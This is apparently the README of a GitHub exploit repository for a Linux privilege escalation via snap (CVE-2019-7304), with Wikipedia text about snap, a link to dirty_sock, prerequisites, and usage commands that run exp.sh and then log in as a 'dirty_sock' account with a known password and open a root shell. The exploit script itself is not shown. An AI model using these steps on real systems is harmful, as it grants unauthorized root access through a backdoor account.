# snap_priv_esc
Another implementation for linux privilege escalation exploit via snap(d) (CVE-2019-7304)
# What is snap?
**Snap** is a software [packaging](https://en.wikipedia.org/wiki/Package_manager "Package manager") and [deployment](https://en.wikipedia.org/wiki/Software_deployment "Software deployment") system developed by [Canonical](https://en.wikipedia.org/wiki/Canonical_(company) "Canonical (company)") for the [operating systems](https://en.wikipedia.org/wiki/Operating_system "Operating system") that use the [Linux](https://en.wikipedia.org/wiki/Linux "Linux") kernel. The packages, called _snaps_, and the tool for using them, _snapd_, work across a range of [Linux distributions](https://en.wikipedia.org/wiki/Linux_distribution "Linux distribution") and allow [upstream](https://en.wikipedia.org/wiki/Upstream_(software_development) "Upstream (software development)") software developers to distribute their applications directly to users. Snaps are self-contained applications running in a sandbox with mediated access to the host system. Snap was originally released for [cloud](https://en.wikipedia.org/wiki/Cloud_computing "Cloud computing") applications[\[1\]](https://en.wikipedia.org/wiki/Snap_(package_manager)#cite_note-:6-1) but was later ported to work for [Internet of Things](https://en.wikipedia.org/wiki/Internet_of_things "Internet of things") devices[\[3\]](https://en.wikipedia.org/wiki/Snap_(package_manager)#cite_note-3)[\[4\]](https://en.wikipedia.org/wiki/Snap_(package_manager)#cite_note-4) and desktop[\[5\]](https://en.wikipedia.org/wiki/Snap_(package_manager)#cite_note-5)[\[6\]](https://en.wikipedia.org/wiki/Snap_(package_manager)#cite_note-6) applications too.

# other snap's esploits :

[dirty_sock: Linux Privilege Escalation (via snapd)](https://github.com/initstring/dirty_sock)

# exploit (without 'snapd' just snap )
### this exploit needs 
	- snap installed on system
	- you have sudo with or without password on snap

# Usage :
```bash
./exp.sh "snap_path" "pwd"
ex:
	./exp.sh "/usr/bin/snap" "/home/evil"

```

then you can use 
```bash
su - dirty_sock
dirty_sock (as password)
sudo bash
```
